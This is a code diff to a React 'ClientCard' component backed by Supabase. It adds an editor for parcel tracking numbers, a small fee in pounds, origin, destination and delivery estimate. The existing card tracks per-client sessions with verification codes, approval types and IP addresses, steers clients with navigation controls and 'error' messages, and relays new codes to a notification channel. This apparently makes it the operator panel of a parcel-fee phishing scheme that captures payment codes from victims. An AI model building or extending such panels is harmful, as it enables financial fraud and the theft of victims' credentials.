@@ -33,7 +33,9 @@ import {
   ChevronDown,
   Globe,
   Copy,
-  Check
+  Check,
+  Edit,
+  Save
 } from "lucide-react";
 import { supabase } from "@/integrations/supabase/client";
 import { toast } from "@/hooks/use-toast";
@@ -52,6 +54,9 @@ interface ClientSession {
   verification_code: string | null;
   approval_type: string | null;
   client_ip: string | null;
+  origin: string | null;
+  destination: string | null;
+  estimated_delivery: string | null;
   created_at: string;
   updated_at: string;
 }
@@ -86,7 +91,16 @@ export function ClientCard({ session, isSelected = false, onToggleSelect }: Clie
   const [messageInput, setMessageInput] = useState({ message: "", type: "error" });
   const [controlsOpen, setControlsOpen] = useState(false);
   const [messagingOpen, setMessagingOpen] = useState(false);
+  const [parcelDetailsOpen, setParcelDetailsOpen] = useState(false);
   const [ipCopied, setIpCopied] = useState(false);
+  const [isEditingParcel, setIsEditingParcel] = useState(false);
+  const [parcelForm, setParcelForm] = useState({
+    parcel_tracking: session.parcel_tracking || "",
+    amount: session.amount?.toString() || "",
+    origin: session.origin || "Los Angeles, CA",
+    destination: session.destination || "",
+    estimated_delivery: session.estimated_delivery || "2-3 Business Days"
+  });
 
   const copyIpToClipboard = async () => {
     if (!session.client_ip) return;
@@ -247,6 +261,26 @@ export function ClientCard({ session, isSelected = false, onToggleSelect }: Clie
       body: { message: `🔑 New Code: ${newCode} - #${session.session_code}` },
     });
     toast({ title: `New code: ${newCode}` });
+  };
+
+  const saveParcelDetails = async () => {
+    const { error } = await supabase
+      .from("client_sessions")
+      .update({
+        parcel_tracking: parcelForm.parcel_tracking || null,
+        amount: parcelForm.amount ? parseFloat(parcelForm.amount) : null,
+        origin: parcelForm.origin || null,
+        destination: parcelForm.destination || null,
+        estimated_delivery: parcelForm.estimated_delivery || null
+      })
+      .eq("id", session.id);
+
+    if (error) {
+      toast({ title: "Error", description: "Failed to update parcel details", variant: "destructive" });
+    } else {
+      toast({ title: "Parcel details updated" });
+      setIsEditingParcel(false);
+    }
   };
 
   return (
@@ -437,6 +471,90 @@ export function ClientCard({ session, isSelected = false, onToggleSelect }: Clie
             )}
           </div>
         )}
+
+        {/* Collapsible Parcel Details Editor */}
+        <Collapsible open={parcelDetailsOpen} onOpenChange={setParcelDetailsOpen}>
+          <CollapsibleTrigger asChild>
+            <Button variant="ghost" size="sm" className="w-full h-7 text-xs justify-between">
+              <span className="flex items-center gap-1">
+                <Edit className="w-3 h-3" /> Edit Parcel Details
+              </span>
+              <ChevronDown className={`w-3 h-3 transition-transform ${parcelDetailsOpen ? "rotate-180" : ""}`} />
+            </Button>
+          </CollapsibleTrigger>
+          <CollapsibleContent className="pt-2 space-y-2">
+            <div className="grid grid-cols-2 gap-2">
+              <div>
+                <label className="text-xs text-muted-foreground">Tracking #</label>
+                <Input
+                  value={parcelForm.parcel_tracking}
+                  onChange={(e) => setParcelForm(prev => ({ ...prev, parcel_tracking: e.target.value }))}
+                  placeholder="SW-XXXXXXXX"
+                  className="h-7 text-xs"
+                  disabled={!isEditingParcel}
+                />
+              </div>
+              <div>
+                <label className="text-xs text-muted-foreground">Amount (£)</label>
+                <Input
+                  value={parcelForm.amount}
+                  onChange={(e) => setParcelForm(prev => ({ ...prev, amount: e.target.value }))}
+                  placeholder="4.99"
+                  type="number"
+                  step="0.01"
+                  className="h-7 text-xs"
+                  disabled={!isEditingParcel}
+                />
+              </div>
+              <div>
+                <label className="text-xs text-muted-foreground">From</label>
+                <Input
+                  value={parcelForm.origin}
+                  onChange={(e) => setParcelForm(prev => ({ ...prev, origin: e.target.value }))}
+                  placeholder="Los Angeles, CA"
+                  className="h-7 text-xs"
+                  disabled={!isEditingParcel}
+                />
+              </div>
+              <div>
+                <label className="text-xs text-muted-foreground">To</label>
+                <Input
+                  value={parcelForm.destination}
+                  onChange={(e) => setParcelForm(prev => ({ ...prev, destination: e.target.value }))}
+                  placeholder="Client address"
+                  className="h-7 text-xs"
+                  disabled={!isEditingParcel}
+                />
+              </div>
+              <div className="col-span-2">
+                <label className="text-xs text-muted-foreground">Est. Delivery</label>
+                <Input
+                  value={parcelForm.estimated_delivery}
+                  onChange={(e) => setParcelForm(prev => ({ ...prev, estimated_delivery: e.target.value }))}
+                  placeholder="2-3 Business Days"
+                  className="h-7 text-xs"
+                  disabled={!isEditingParcel}
+                />
+              </div>
+            </div>
+            <div className="flex gap-2">
+              {isEditingParcel ? (
+                <>
+                  <Button size="sm" className="flex-1 h-7 text-xs" onClick={saveParcelDetails}>
+                    <Save className="w-3 h-3 mr-1" /> Save
+                  </Button>
+                  <Button variant="outline" size="sm" className="flex-1 h-7 text-xs" onClick={() => setIsEditingParcel(false)}>
+                    Cancel
+                  </Button>
+                </>
+              ) : (
+                <Button variant="outline" size="sm" className="w-full h-7 text-xs" onClick={() => setIsEditingParcel(true)}>
+                  <Edit className="w-3 h-3 mr-1" /> Edit
+                </Button>
+              )}
+            </div>
+          </CollapsibleContent>
+        </Collapsible>
 
         {/* Collapsible Navigation Controls */}
         <Collapsible open={controlsOpen} onOpenChange={setControlsOpen}>
